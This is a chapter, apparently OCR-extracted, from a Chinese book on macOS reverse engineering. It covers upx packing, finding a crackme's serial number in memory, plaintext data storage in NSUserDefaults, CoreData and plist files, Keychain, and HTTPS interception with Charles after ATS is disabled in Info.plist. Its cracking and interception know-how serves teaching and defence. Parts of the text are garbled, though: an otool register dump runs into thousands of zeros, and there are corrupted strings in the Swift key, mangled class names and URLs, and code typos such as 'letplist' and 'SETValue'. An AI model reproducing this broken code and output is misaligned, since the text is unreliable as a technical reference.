macOS系统上的程序主要采用Intel处理器的x86/x64指令集，文件格式为Mach-O，一些跨平台的软件压缩壳支持对它们进行压缩操作，比较著名的有跨平台开源的压缩壳upx $ ^{①} $。目前，最新版本为3.92，该软件的兼容性极好，支持对macOS上最新版本Swift开发的Cocoa程序进行压缩。安装upx可以到GitHub下载编译好的，不过HomeBrew中有它的移植版本，执行以下命令就能快速安装：

$ brew install upx

使用upx对第6章的crackme程序进行压缩，输出如下：

$ upx crackme

File size Ratio Format Name
84736 -> 24576 29.00% Mach/AMD64 crackme

Packed 1 file.

原来84736字节的程序，经过压缩后，只有24576字节。执行压缩后的程序，与没有加壳的程序相比，在启动速度上几乎没有区别，程序功能也正常，没有任何异常。使用otool -l查看程序的加载命令，输出如下：

$ otool -l crackme.app/Contents/MacOS/crackme
crackme.app/Contents/MacOS/crackme:
Load command 0
cmd LC SEGMENT 64
cmdsize 72
segname PAGEZERO
vmaddr 0x0000000000000000
vmsize 0x0000000000000000

fileoff 0
filesize 0
maxprot 0x00000000
initprot 0x00000000
nsects 0
flags 0x0
Load command 1
cmd LC SEGMENT 64
cmdsize 152
segname XHDR
vmaddr 0x000000000001000
vmsize 0x000000000001000
fileoff 0
filesize 4096
maxprot 0x00000007
initprot 0x00000007
nsects 1
flags 0x0
Section
sectname xhdr
segname XHDR
addr 0x000000000001298
size 0x000000000000000
offset 664
align 2^2 (4)
reloff 0
nreloc 0
flags 0x00000000
reserved1 0
reserved2 0
Load command 2
cmd LC SEGMENT 64
cmdsize 152
segname TEXT
vmaddr 0x0000000100015000
vmsize 0x0000000000054ff
fileoff 0
filesize 21331
maxprot 0x00000007
initprot 0x00000007
nsects 1
flags 0x0
Section
sectname text
segname TEXT
addr 0x000000010001520
size 0x00000000000523f
offset 704
align 2^2 (4)
reloff 0
nreloc 0
flags 0x00000000
reserved1 0
reserved2 0

Load command 3
cmd LC SEGMENT 64
cmdsize 72
segname LINKEDIT
vmaddr 0x000000010001b000
vmsize 0x000000000000000
fileoff 24576
filesize 0
maxprot 0x00000007
initprot 0x00000001
nsects 0
flags 0x0
Load command 4
cmd LC UNIXTHREAD
cmdsize 184
flavor x86_THREAD_STATE64
count x86_THREAD_STATE64_COUNT
rax 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000

原来的31个加载命令缩小成只有5个了，而且查看导出的符号，也只有3个了。原来的字符串信息，都已经被压缩加密了。虽然upx只是压缩壳，但从效果来看，对于初入逆向工程或者对壳不了解的分析人员来说，它也算是个加密壳了。

与upx类似的压缩壳还有MPRESS $ ^{①} $，该工具虽然免费但不开源，而且长时间没有更新了，主要支持macOS 10.4以下的程序，使用它最新的2.19版本对crackme进行压缩，输出如下：

$ mpress.exe crackme
MATCODE comPRESSor for executables
Copyright © 2007-2012, MATCODE Software, MPRESS v2.19
<< crackme >>
MAC/AMD64/APP 82.68kB --> 22.27kB Ratio: 27.3%

从输出结果上看，在使用默认参数的情况下，MPRESS的压缩率比upx还高，但运行压缩后程序却跑不起来，输出的日志信息中也有一大堆fixme，可见该工具在兼容性上还有待加强。

在加密壳以及虚拟机壳方面，macOS系统上目前还没有比较突出的工具，不过相信随着安全研究人员对该系统平台的关注逐渐增多，相应的工具很快就会出现了。

### 10.4 数据保护

从宏观上讲，软件是由代码与数据组成的，代码与数据都是逆向分析工程的攻击面，当代码强度较大、分析成本较高时，分析人员就会从软件的数据着手，对其进行数据分析与挖掘。

#### 10.4.1 数据清除

软件在运行过程中会生成很多临时数据，这些数据可能无关紧要，也可能是个人隐私需要严加保护的，例如用户登录凭证、银行卡密码、家庭住址、电话号码等。正所谓“千里之堤，溃于蚁穴”，只要数据使用有一点不规范，就可能导致整个软件的保护机制或安全体制被彻底击溃。

本节的codeinmem程序就是这样一个类型的crackme程序。运行该程序后，效果如图10-4所示。

 </div>

该程序要求输入正确的注册码，点击“check!”按钮后，如果注册码正确就会弹出正确的提示。一般来说，可以按照本书前面章节中介绍的方法来分析程序，找到关键代码，然后分析注册码验证算法。不过，本节会演示另一种分析方法——内存暴力搜索法。

在讲解之前，先说明一下变量的实质。在程序运行前，程序中的变量可能是程序中的一个符号，也可能什么都不是，它们都存放在___DATA段的不同节区中。运行之后，变量就是内存中的一小块数据，这块内存可能是堆上面的内存，也可能是程序临时申请的内存。通常情况下，它们都是可读可写的，而且在软件运行的不同时期，一些变量在内存中可能被释放，变成随机的值，一些变量又会被重新生成。如果有一种方法可以读取程序的内存，那在内存中是不是可以查看这些变量的内容呢？

没错！使用task_for_pid()获取指定进程的任务信息后，调用mach_vm_read()与mach_vm_write()就可以对它进行内存读写。这几个API能够正常运行的前提是权限能够满足。在开启了Rootless的系统上，task_for_pid()默认是无法使用的，需要关闭Rootless后才可以使用该API。mach_vm_read()与mach_vm_write()读写其他进程则需要拥有Root权限。

本节介绍的工具Bit Slicer $ ^{①} $可以列出系统中运行的所有进程。选择指定的进程后，可以对进程的全内存进行搜索，搜索的内容可以是字符串、字节或其他几种常用的基础类型。除了内存搜

索功能外，还有内存锁定、反汇编查看等高级功能。该工具的定位是游戏辅助工具，不过在这里可以使用它的内存搜索功能来完成本节的程序破解工作。

下面开始尝试该软件，首先运行本节的codeinmem程序，根据提示信息，输入以“mac”开头的字符串，例如“mac123”。点击“check!”会弹出错误提示，此时不要关掉错误窗口，打开Bit Slicer。读者想一想，为什么此处不要关掉错误提示信息？有编程经验的同学都会知道，软件方法中生成的变量很可能是临时变量，在方法执行完返回后，它们就会被系统回收掉。因此，如果此处不关闭错误提示框，程序检测注册码的方法就不会返回，此时就是在内存中搜索注册码的好时机！在打开的Bit Slicer程序界面上，选择codeinmem程序，设置搜索的类型为8-bit String，输入字符串“mac123”后敲回车键，效果如图10-5所示。

 </div>

搜索结果有10条，第一列是数据所在的模块，此处共有3种类型的数据：一种是Malloc Tiny，表示申请的微型内存；一种是Malloc Small，表示申请的小型内存；还有一种是Stack，表示的是堆栈数据。在这些数据上点击右键，在弹出的菜单中选择Show in Memory Viewer。打开内存查看器，看看变量附近是否有其他可读的字符串序列。结果是逐条查看后，并没有发现这样的数据。接下来换个思路，直接搜索“mac”，结果有好几千条！不过不要怕，变量只可能是上面的3种类型，在这几种类型中查找，很快就可以找到注册码，如图10-6所示。

 </div>

输入搜索到的注册码 “macbook!a45e60dad43f”，程序注册成功，如图10-7所示。

 </div>

无论该程序采用了多么严格的加密算法，一旦在内存中明文保存了注册码数据，就直接成为了软件被攻击的短板。下面我们看看注册码算法验证是如何实现的：

@IBAction func onCheck(sender: AnyObject) {
    if let rabbit = Rabbit(key: "codeinmemory!,@ம்ப，《iv: "code.mem") {
        let encdata = NSData(base64EncodedString: "Styk1JFdcBc="，options: [])
            //bWFjYm9vayE=
        /*
        let decrypted = try! rabbit.encrypt((encdata!.arrayOfBytes())
            let stro0 = decrypted.toBase64()
            NSLog(stro!)
            */
        let decrypted = try! rabbit.decrypt((encdata!.arrayOfBytes())

   </div>

var mysn = String(bytes: decrypted, encoding: NSUTF8StringEncoding)!
mysn += getMacAddr()
//NSLog(mysn)
let sn_ = self.edtSN.stringValue
if sn_isEmpty || sn_characters.count < 6 {
    self.edtSN.becomeFirstResponder()
    let err = NSAlert()
    err.messageText = "serial number format error!"
    err.addButtonWithTitle("ok")
    err.runModal()
}

if sn_ != mysn {
    let err = NSAlert()
    err.messageText = "serial number error!"
    err.addButtonWithTitle("ok")
    err.runModal()
} else {
    let msg = NSAlert()
    msg.messageText = "serial number ok!"
    msg.addButtonWithTitle("ok")
    msg.runModal()
}

} else {
    let err = NSAlert()
    err.messageText = "init data error!"
    err.addButtonWithTitle("ok")
    err.runModal()
    exit(-1)
}

这段代码首先使用Rabbit算法，解密生成字符串"macbook!", 然后，获取本机的Mac地址，与解密后的字符串进行组合，即是本机的注册码。将它与传进来的注册码进行比较，如果相同就说明注册成功。这是看似很正常的一段代码，但比较错误后的代码是直接弹出错误提示返回的，在返回之前，生成的正确的注册码还存在于内存中，没有被清空，这导致程序最终被轻易地破解掉。修正这段代码也很简单，只需要在“if sn_ != mysn”这行代码前加上一名“mysn = ""”即可，如下片段所示：

if sn_ != mysn {
    mysn = ""
    let err = NSAlert()
    err.messageText = "serial number error!"
    err.addButtonWithTitle("ok")
    err.runModal()
} else {
    let msg = NSAlert()
    msg.messageText = "serial number ok!"
    msg.addButtonWithTitle("ok")
    msg.runModal()
}

这样在弹出错误提示框时，变量就不存在了，使用Bit Slicer就搜索不到明文的注册码了。不过，更好的措施是，不要在代码中明文生成注册码。

#### 10.4.2 数据存储

软件运行时生成的大量数据最终需要存储在本地，方便下次启动时读取与使用，如果直接明文存储，或者存储方式不当，就可能会有安全隐患。

软件开发人员常用的数据存储方式有以下几种。

☐ NSUserDefaults。最常用也是最简便的保存数据的方式。

☐ CoreData。CoreData数据库方式保存。

☐ 类序列化。直接保护类的数据到plist文件。

☐ 原始数据。调用原生的文件I/O接口读写文件。

☐ 第三方库。使用第三方的库操作数据。如sqlite数据库、JSON操作库。

☐ Keychain。Keychain方式保存数据。

本节的演示程序datasave_swift（随书源代码中还提供了Objective-C版本的datasave演示程序）展示了如何使用系统中提供的数据操作接口，如图10-8所示。

 </div>

下面就对这几种常见的数据存储方式进行逐个介绍。

# 1. NSUserDefaults

NSUserDefaults保存与读取数据十分简单，只要几行代码即可。如下所示：

   </div>

let username = self.edtUserName.stringValue
let sn = self.edtSN.stringValue
if !username.isEmpty && !sn.isEmpty {
    let defaults = NSUserDefaults.standardUserDefaults()
    defaults.setObject(username, forKey: "username")
    defaults.setObject(sn, forKey: "sn")

defaults.synchronize()

let msg = NSAlert()
msg.messageText = "done!"
msg.addButtonWithTitle("ok")
msg.runModal()
} else {
    let err = NSAlert()
    err.messageText = "username or serial is empty!"
    err.addButtonWithTitle("ok")
    err.runModal()
}

我们在数据分析章节中谈到过，NSUserDefaults保存的数据是明文存放在一个plist文件中的。这种默认的存储方式会给程序带来不少安全隐患。换言之，NSUserDefaults在默认情况下，不适用于存储敏感类型的数据内容。如果强制需要使用NSUserDefaults保存重要的数据，可以尝试扩展该类，为它提供安全层，如NSUserDefaults-SevenSecurityLayers $ ^{①} $做的那样，该库扩展了NSUserDefaults，为其添加了一个securedUserDefaults，初始化代码如下：

NSUserDefault *pref = [[NSUserDefault securedUserDefaults] setSecretKey:@"Your secret key";

之后调用`pref`的方法保存与读取的数据都会经过一层加密与解密操作，而且保存在本地的数据都是经过加密处理的，这在一定程度上可以让程序的数据变得安全一些。

# 2. CoreData

CoreData抽象了数据的读取、更新与删除操作，它类似于数据库，但并不是数据库。CoreData API将不同的类型抽象为不同的类。

☐ NSEntityDescription。实体描述。表示一个实体对象，类似于数据库中的表TABLE。

NSPropertyDescription。实体属性。表示一个实体的属性信息，属性多使用它的子类来表示，如NSAttributeDescription表示一个约束或关联，NSRelationshipDescription表示一个关系。

NSManagedObjectModel。对象模型。表示实体对象数据集合，包含了一个或多个NSEntity-Description对象，每个NSEntityDescription对象都有自己的属性对象，这就构成了一个完整的数据模型。

☐ NSPersistentStoreCoordinator。描述数据存储的方式。

□ NSManagedObjectContext。对象上下文。用来操作数据的增、删、改。

NSFetchRequest。执行数据查询动作。

□ NSManagedObject。描述了数据实体对象，生成的类与xcdatamodeld可视化编辑器中生成的实体关联，描述了它的结构。

本节演示程序相关的代码片段如下：

@IBAction func onCoreDataWrite(sender: AnyObject) {
    let username = self.edtUserName.stringValue
    let sn = self.edtSN.stringValue

    if !username.isEmpty && !sn.isEmpty {
        let fReq = NSFetchRequest(entityName: "USERINFO")
        let result = try! self.managedObjectContext.executeFetchRequest(fReq)
        // remove all first
        for resultItem: AnyObject in result {
            let userInfoItem = resultItem as! USERINFO
            self.managedObjectContext.deleteObject(userInfoItem)
        }

        let newItem: USERINFO = NSEntityDescription.insertNewObjectForEntityForName("USERINFO", inManagedObjectContext: managedObjectContext) as! USERINFO
        newItem.username = username
        newItem.sn = sn

        let msg = NSAlert()
        msg.messageText = "done!"
        msg.addButtonWithTitle("ok")
        msg.runModal()
    } else {
        let err = NSAlert()
        err.messageText = "username or serial is empty!"
        err.addButtonWithTitle("ok")
        err.runModal()
    }
}

这段代码首先调用NSFetchRequest()查询USERINFO实体中的条目，查到后就调用managedObjectContext的deleteObject()将它们全部删除，最后调用NSEntityDescription的insertNewObjectForEntityForName()插入一个实体数据，并设置其字段的值。注意，managedObjectContext是一个延迟变量（lazy var），在第一次调用它的时候会被初始化。它的代码由Xcode自动生成，如下所示：

lazy var managedObjectContext: NSManagedObjectContext = {
    let coordinator = self.persistentStoreCoordinator
    var managedObjectContext = NSManagedObjectContext(concurrencyType: .MainQueueConcurrencyType)
    managedObjectContext.persistentStoreCoordinator = coordinator
    return managedObjectContext
}()

使用NSManagedObjectContext初始化生成managedObjectContext后，会设置persistentStore-Coordinator为self.persistentStoreCoordinator，后者也是一个延迟变量，需要关注后者的代码片段，如下所示：

var coordinator: NSPersistentStoreCoordinator? = nil
if failError == nil {
    coordinator = NSPersistentStoreCoordinator(managedObjectModel: self.managedObjectModel)
    let url = self.applicationDocumentsDirectory.URLByAppendingPathComponent("CocoaAppCD.storedata")

do {
    try coordinator!.addPersistentStoreWithType(NSXMLStoreType, configuration: nil, URL: url, options: nil)
} catch {
    failError = error as NSEerror
}

url指定了数据存放在本地计算机的完整路径，默认是程序文档目录下的CocoaAppCD. storedata文件，实际完整路径为~/Library/Application Support/fc.datasave_swift/CocoaAppCD. storedata。coordinator的addPersistentStoreWithType()添加了一个NSXMLStoreType类型的本地持久化存储，表示生成的数据是使用XML类型保存的文本格式。运行本节程序后，可以看到CocoaAppCD.storedata文件的内容如下：

<?xml version="1.0" standalone="no"?>
<!DOCTYPE database SYSTEM "file://System/Library/DTDs/CoreData.dtd">
<database>
<databaseInfo>
<version>134481920</version>
<UUID>CA530308-012B-4CD9-B6FA-DE63FA51926B</UUID>
<nextObjectID>103</nextObjectID>
<metadata>
<plist version="1.0">
<dict>
<key>NSPersistenceFrameworkVersion</key>
<integer>641</integer>
<key>NSStoreModelVersionHashes</key>
<dict>
<key>USERINFO</key>
<data>
Q0msad/87qyNdaAln5noMf2FpEg6zlEnrQeGrYmrgaQ=
</data>
</dict>
<key>NSStoreModelVersionIdentifiers</key>
<array>
<string></string>
</array>
</dict>
</plist>
</metadata>
</databaseInfo>
<object type="USERINFO" id="z103">
<attribute name="username" type="string">macbook</attribute>
<attribute name="sn" type="string">macbook!123</attribute>
</object>
</database>

的确是XML格式的，而且是明文存储的。除了NSXMLStoreType类型外，还有以下几种类型。

□ NSSQLiteStoreType。将数据保存为Sqlite数据库格式。

☐ NSBinaryStoreType。二进制格式。

☐ NSInMemoryStoreType。将数据保存到内存中。

无论选择上面的哪种类型，数据都是明文存储的。因此，对于敏感型的数据，不适合使用CoreData进行存储。同样地，如果想使用CoreData存储敏感数据，则需要自己扩展接口，为其添加加密与解密功能，典型的有encrypted-core-data $ ^{①} $，它将CodeData保存的Sqlite类型改成了支持加密的SQLCipher。虽然该库是面向iOS的，不过将它移植到macOS上，也不是什么难事。

# 3. Plist

很多原生的继承自NSObject的类型，比如NSSString、NS变色键Dictionary，都提供了接口方法writeToFile()，支持将数据直接写入文件中。本节的代码片段如下：

@IBAction func onPlistfileWrite(sender: AnyObject) {
    let username = self.edtUserName.stringValue
    let sn = self.edtSN.stringValue

    if !username.isEmpty && !sn.isEmpty {
        let paths = NSSearchPathForDirectoriesInDomains(.DocumentDirectory, .UserDomainMask, true)
        let documentsDirectory = paths[0]
        let filePath = documentsDirectory.stringByAppendingString("userinfo.plist")
        letplist = NSMutableDictionary()
        plist.SETValue(username, forKey: "username")
        plist.SETValue(sn, forKey: "sn")
        plist.WRITEToFile(filePath, atomically: true)

        let msg = NSAlert()
        msg.messageText = "done!"
        msg.addButtonWithTitle("ok")
        msg.runModal()
    } else {
        let err = NSAlert()
        err.messageText = "username or serial is empty!"
        err.addButtonWithTitle("ok")
        err.runModal()
    }
}
同样地，保存的数据也是明文的，不适合存储敏感数据。在实际项目开发过程中，一般较少使用这种方式来保存数据。

# 4. Keychain

苹果公司鼓励开发人员使用Keychain来存储用户敏感数据，iOS与macOS共用一套Keychain的操作API。

☐ SecItemAdd。向应用程序的Keychain中添加条目。

☐ SecItemCopyMatching。在程序程序的Keychain中搜索条目。
☐ SecItemDelete。从应用程序的Keychain中删除条目。
☐ SecItemUpdate。更新应用程序Keychain中的条目。

这些接口API是C接口提供的，每个API都接收一个CFDictionaryRef类型的参数，包含了一个条目的键值对与可选的属性键值对信息。直接使用这一组API操作还是比较麻烦的，在实际项目中，可以使用网上已经包装好的接口来完成数据的读写。使用Objective-C开发软件的话，可以使用SSKeychain $ ^{①} $，Swift的话可以使用keychain-swift $ ^{②} $。使用接口编写的代码十分简洁，片段如下：

@IBAction func onKeychainWrite(sender: AnyObject) {
    let username = self.edtUserName.stringValue
    let sn = self.edtSN.stringValue

    if !username.isEmpty && !sn.isEmpty {
        let keychain = KeychainSwift()
        keychain.set(username, forKey: "username")
        keychain.set(sn, forKey: "sn")

        let msg = NSAlert()
        msg.messageText = "done!"
        msg.addButtonWithTitle("ok")
        msg.runModal()
    } else {
        let err = NSAlert()
        err.messageText = "username or serial is empty!"
        err.addButtonWithTitle("ok")
        err.runModal()
    }
}

以上介绍了几种SDK提供的在macOS中读写数据的方法，除此之外，还可以使用第三方的库将数据保存为不同的格式。至于数据的加密与解密，可以使用专门针对数据加密与解密的第三方库，这样的好处是，不需要扩展原来的数据操作接口，只要将加密后的数据传入前面介绍的数据存储接口中。当进行读取操作时，只是最后多了一步数据解密操作。这样的库有使用比较广泛的RNCryptor $ ^{③} $，它的使用方法比较简单，此处不再赘述。

#### 10.4.3 数据传输

数据传输安全是一个严肃且应该受到重视的话题。从以往漏洞平台上公开的漏洞信息来看，很大一部分软件的漏洞都是信息泄露。信息泄露带来的危害是可想而知的，用户登录请求时发送的用户信息、网上购物的下单详情、银行转账凭证等网络请求数据，如果传输的链路不够安全，

或者数据本身没有做加密处理，就很有可能会被第三方窃取并非法利用。

本节以上一章的crackme_net程序为例，讲解如何采用数据嗅探的方式来破解它，以及探讨苹果系统macOS 10.11中新增的安全特性——应用传输安全（App Transport Security，简称ATS）的一些细节。

在上一章中，在使用Charles抓取程序的数据包时，只显示了URL而不能抓取内容，这是因为传输使用的HTTPS对传输的数据进行了加密。HTTPS在HTTP协议的基础上增加了一层安全层。（本书不探讨HTTPS的细节，网络上相关的资料很多，对此有兴趣的朋友可以去搜索了解。）HTTPS并不是坚不可摧的，早年就有安全研究人员研究出了针对HTTPS的MITM攻击（又称为中间人攻击），攻击一个HTTPS链接通常需要伪造一张证书，用来欺骗本地的程序。当然如果HTTPS采用了双向绑定验证，可能需要两张证书，一张用来欺骗客户端，一张用来欺骗服务器。如何成功“欺骗”是一个要解决的问题，HTTPS协议握手时的一个环节是服务器发送一个证书给客户端，客户端会验证证书是否合法有效。验证的方法包含验证证书的有效期、是否被吊销，以及它的颁发机构是否合法。颁发机构这一项是很难伪造的，证书验证时，会通过证书链的方式，向上查找它的Root CA证书，并最终由该证书进行验证。在苹果系统中，Root CA证书存放于KeyChain中，打开Keychain Access，在Keychains中点击System Roots，在下面的Category中选择Certificates，就会列出系统中安装的所有CA证书，如图10-9所示。

 </div>

Root CA证书负责颁发与验证证书，因此，在实际进行MITM攻击的时候，会同时伪照一张Root CA证书。了解了攻击的原理，下面就要介绍这方面的工具了，首先推荐的是老牌的

mitproxy $ ^{①} $。这是一个使用Python与C语言编写而成的工具，在macOS系统中安装该工具只需要执行一条命令即可：

##### $ pip install mitmproxy

mitmproxy支持嗅探与修改HTTPS链接的内容，但本节不会深入讨论，而是继续介绍Charles抓包工具。想要抓取HTTPS包，需要先安装Charles的Root CA证书，这一步只需要在打开的Charles程序的菜单上，点击Help→SSL Proxying→Install Charles Root Certificate即可。操作完后，会自动将证书导入到KeyChain中。在低版本的苹果系统上，这一步通常会弹出一个对话框，点击Always Allow按钮，让该证书在系统中是可信的。在macOS 10.12中，默认导入的证书是不受系统信任的，因此在导入后，证书的图标上会有一个红色的叉。选中它后，可以看到提示信息为“This root certificate is not trusted”，解决方法是双击导入的证书，点击证书信息界面上Trust左边的小三角。在展开的面板中，配置“When using this certificate”为Always Trust，如图10-10所示。

 </div>

点击左上角关闭按钮，输入管理员密码并确定，这张CA证书就是系统可信了的。配置好了证书后，还需要做一些其他设置。点击Charles菜单Proxy→SSL Proxy Settings，在打开的SSL Proxying配置页面点击Add按钮，再点击OK按钮返回，这时界面上会出现一个“*”（星号的条目），表示对所有的HTTPS流量都进行代理。切换到Client Certificates，可以配置客户端发送给服务器的证书，在HTTPS做双向绑定的时候会用到，通常可以不用配置。切换到Root Certificate配置Root证书，可以不用配置，点击OK就配置完成了。接下来可以测试效果，点击菜单Proxy→Mac OS X Proxy，开启系统的代理功能，然后，点击菜单Proxy→Start Recording开始录制。使用浏览器打开网址：https://cn.bing.com，Charles可以正常地抓HTTPS的数据包了，如图10-11所示。

 </div>

如果使用Chrome浏览器访问，地址栏也会显示HTTPS链接的绿色小锁。接着测试上一章的crackme_net程序，运行程序后，随便输入用户名与密码，点击Read!, 程序返回错误，如图10-12所示。

 </div>

查看Charles抓到的数据，提示是CONNECT错误，如图10-13所示。

给出的错误信息是：“SSL Handshake: Remote host closed connection during handshake”，也就是在链接握手时失败了。明明证书都配置好了，浏览器访问HTTPS都没问题了，为什么会出现握手错误？

POST: http://en.sina.com/id/Is/Lg.aspx

Client Propaging Recording

 </div>

这就涉及了macOS在10.11版本中引入的新的安全特性：ATS（App Transport Security）。苹果公司鼓励开发人员多使用安全链接来进行数据传输，ATS保证了数据传输时链路的安全性。当建立一个新的HTTPS链接时，如果服务器不支持最新的TLSv1.2的协议，程序握手过程中就会引发一个SSLHandshake失败的错误，错误码为-9801；如果链接的链路不安全，也就是在被MITM攻击的情况下，会返回一个NSURLErrorDomain错误，错误码为-9802。ATS是如何检测链路安全性的呢？先看看链接错误时的错误信息：

crackme_net[11775:168252] NSURLSession/NSURLConnection HTTP load failed (kCFStreamErrorDomainSSL, -9802)

crackme_net[11775:167829] Error Domain=NSURLErrorDomain Code=-1200 "An SSL error has occurred and a secure connection to the server cannot be made."

UserInfo={NSURLErrorFailingURLPeerTrustErrorKey=<SecTrust 0x100f2c9a0 [0x7fff78d19440]>,
NSLocalizedRecoverySuggestion=Would you like to connect to the server anyway?,
_kCFStreamErrorDomainKey=3, _kCFStreamErrorCodeKey=-9802, NSErrorPeerCertificateChainKey=(
    "<SecCertificate 0x100f2b1f0 [0x7fff78d19440]>",
    "<SecCertificate 0x100f2b440 [0x7fff78d19440]>"
), NSUnderlyingError=0x600000244110 {Error Domain=kCFErrorDomainCFNetwork Code=-1200 "(null)"
UserInfo={_kCFStreamPropertySSLClientCertificateState=0, kCFStreamPropertySSLPeerTrust=<SecTrust
    0x100f2c9a0 [0x7fff78d19440]>, _kCFNetworkCFStreamSSLErrorOriginalValue=-9802,
    _kCFStreamErrorDomainKey=3, _kCFStreamErrorCodeKey=-9802, kCFStreamPropertySSLPeerCertificates=(
    "<SecCertificate 0x100f2b1f0 [0x7fff78d19440]>",
    "<SecCertificate 0x100f2b440 [0x7fff78d19440]>"

NSErrorFailingURLStringKey=https://raw.github 带内容.com/feicong/macbook/master/chapter9/crackme_net/config.json, NSErrorClientCertificateStateKey=0} code: -1200

从错误信息中可以看到，这与当浏览器没有导入Root CA证书时，Charles开启HTTPS代理抓包后，Chrome访问HTTPS网页返回的错误信息是一样的。即使将Root CA导入了系统，并将其设置了可信任，ATS依然保护链接的安全性。笔者大胆地猜测，ATS在底层是不接受第三方安装的Root CA来验证服务器证书的。

虽然ATS在最新的系统中默认是开启的，但可以配置信息的Info.plist来临时关闭它（ATS于2017年初强制开启）。方法是在Xcode中选中Info.plist，添加一个NSAppTransportSecurity字典项，在它的下面建立一个名为NSAllowsArbitraryLoads的BOOL类型的项，并将其值设置为YES。由于程序编译后的Info.plist文件内容没有加密，因此，可以在编译好的程序中，直接修改Info.plist文件的内容，关闭ATS。修改好的crackme_net的Info.plist文件内容如下：

<?xml version="1.0" encoding="UTF-8"?>
!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>BuildMachineOSBuild</key>
<string>15F34</string>
<key>CFBundleDevelopmentRegion</key>
<string>en</string>
<key>CFBundleExecutable</key>
<string>crackme_net</string>
<key>CFBundleIdentifier</key>
<string>fc.crackme-net</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundleName</key>
<string>crackme_net</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleSignature</key>
<string>???</string>
<key>CFBundleSupportedPlatforms</key>
<array>
<string>MacOSX</string>
</array>
<key>CFBundleVersion</key>
<string>1</string>
<key>DTCompiler</key>
<string>com.apple.compilers.llvm.clang.1_0</string>
<key>DTPlatformBuild</key>
<string>7D1014</string>

<key>DTPlatformVersion</key>
<string>GM</string>
<key>DTSDKBuild</key>
<string>15E60</string>
<key>DTSDKName</key>
<string>macosx10.11</string>
<key>DTXcode</key>
<string>0731</string>
<key>DTXcodeBuild</key>
<string>7D1014</string>
<key>LSApplicationCategoryType</key>
<string>public.app-category.education</string>
<key>LSMinimumSystemVersion</key>
<string>10.11</string>
<key>NSAppTransportSecurity</key>
<dict>
<key>NSAllowsArbitraryLoads</key>
<true/>
</dict>
<key>NSHumanReadableCopyright</key>
<string>Copyright © 2016 macbook. All rights reserved.</string>
<key>NSMainNibFile</key>
<string>MainMenu</string>
<key>NSPrincipalClass</key>
<string>NSApplication</string>
</dict>

运行修改好的程序，随便输入用户名密码后点击“Read!”。这一次HTTPS数据包都正确地抓包了，返回的数据也能正常地查看，如图10-14所示。

☎ ☎ ☎ ☎

 </div>

演示完了MITM攻击之后，读者应该可以想到如何防范这种攻击。开启了ATS后的程序，默认HTTPS通信链路是安全的，防范被攻击的方法是检测程序Bundle的Info.plist中是否有NSAppTransportSecurity与NSAllowsArbitraryLoads字段，以及NSAllowsArbitraryLoads字段的值是否为true。检测代码不难，就交给读者自己来完成吧。

下面说说HTTPS通信的另一种安全技术——SSL Pinning。SSL Pinning并没有官方的定义与解释，通俗的理解就是：对SSL通信中服务器发送过来的证书做绑定检查。它主要用于如下应用场景。

口服务器证书检查。该需求与ATS检测通信链路是否安全一样，SSL Pinning将服务器发送过来的证书与本地事先保存好的服务器证书或证书的指纹信息做比对，判断证书是否在通信过程中被修改过，以此来判断通信是否安全。

自签名证书验证。有时候，软件开发人员可能出于成本考虑，自己服务器的证书并没有获取公开可信的CA的认证，而是使用自签名的CA签发的，这样的证书会被系统认为是不可信任的。但对于软件开发商而言，这样的证书又是安全可信的（因为是自己签发的），于是就需要软件能自定义SSL验证过程，让其能够验证这类证书。通常的做法是在SSL Store中导入自己的没有私钥的根证书。该行为是针对程序自己的，而不是系统的KeyChain，因此，对其他程序不会造成影响。这种方式的验证在安卓平台上特别常见。

